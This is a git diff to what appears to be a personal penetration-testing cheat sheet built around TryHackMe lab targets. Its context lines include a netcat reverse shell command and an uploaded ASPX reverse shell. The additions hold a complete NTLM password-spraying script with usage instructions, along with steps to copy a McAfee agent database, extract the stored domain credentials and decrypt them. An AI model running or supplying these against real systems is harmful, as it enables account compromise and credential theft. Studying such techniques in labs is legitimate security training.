@@ -177,6 +177,10 @@ In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP s
 http://10.129.47.240/reverse-shell.aspx
 ```
 Go back to your listener to see if the shell connected back.
+#### Database file found (.db)
+```
+sqlitebrowser ma.db
+```
 
 #### <span style="color:rgb(11, 142, 224)">Web Application </span>
 
@@ -413,6 +417,13 @@ nc64.exe -e cmd.exe 192.168.163.199 4444
 ```
 
 -----
+
+### (Scp) Windows → Linux (if ssh into windows system) : 
+
+run this on kali : 
+```
+scp username@remote_host:/path/to/file .
+```
 ### Linux get file : 
 ```
 wget http://<ip>:8000/filename -O filename
@@ -2736,6 +2747,129 @@ john --show --format=krb5tgs hash.txt
 ```
 
 ### <span style="color:rgb(11, 142, 224)">Breaching : </span>
+
+##### NTLM and NetNTLM Authenticated Services : 
+
+If you already have some credentials : 
+Password Spraying/brute force : 
+
+make a list of usernames and 
+We can run the script using the following command:
+```
+python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
+# python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p 
+```
+
+```
+- <userfile> - Textfile containing our usernames - _"usernames.txt"_
+- <fqdn> - Fully qualified domain name associated with the organisation that we are attacking - _"za.tryhackme.com"_
+- <password> - The password we want to use for our spraying attack - _"Changeme123"_
+- <attackurl> - The URL of the application that supports Windows Authentication - _"http://ntlmauth.za.tryhackme.com"_
+```
+
+for errors : 
+```
+sudo python3 -m pip install requests-ntlm --break-system-packages
+```
+###### script : 
+
+```python
+#!/usr/bin/python3
+
+import requests
+from requests_ntlm import HttpNtlmAuth
+import sys, getopt
+
+class NTLMSprayer:
+    def __init__(self, fqdn):
+        self.HTTP_AUTH_FAILED_CODE = 401
+        self.HTTP_AUTH_SUCCEED_CODE = 200
+        self.verbose = True
+        self.fqdn = fqdn
+
+    def load_users(self, userfile):
+        self.users = []
+        lines = open(userfile, 'r').readlines()
+        for line in lines:
+            self.users.append(line.replace("\r", "").replace("\n", ""))
+
+    def password_spray(self, password, url):
+        print ("[*] Starting passwords spray attack using the following password: " + password)
+        count = 0
+        for user in self.users:
+            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+                count += 1
+                continue
+            if (self.verbose):
+                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                    print ("[-] Failed login with Username: " + user)
+        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+
+def main(argv):
+    userfile = ''
+    fqdn = ''
+    password = ''
+    attackurl = ''
+
+    try:
+        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
+    except getopt.GetoptError:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
+
+    for opt, arg in opts:
+        if opt == '-h':
+            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+            sys.exit()
+        elif opt in ("-u", "--userfile"):
+            userfile = str(arg)
+        elif opt in ("-f", "--fqdn"):
+            fqdn = str(arg)
+        elif opt in ("-p", "--password"):
+            password = str(arg)
+        elif opt in ("-a", "--attackurl"):
+            attackurl = str(arg)
+
+    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
+        #Start attack
+        sprayer = NTLMSprayer(fqdn)
+        sprayer.load_users(userfile)
+        sprayer.password_spray(password, attackurl)
+        sys.exit()
+    else:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
+
+
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+```
+
+##### Enumerating Config Files : 
+
+McAfee embeds the credentials used during installation : 
+
+```
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+```
+
+open the database : 
+```
+sqlitebrowser ma.db
+```
+
+Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table
+We are particularly interested in the second entry focusing on the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries
+
+https://github.com/funoverip/mcafee-sitelist-pwd-decryption
+
+```
+python3 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
+```
+
 
 
 
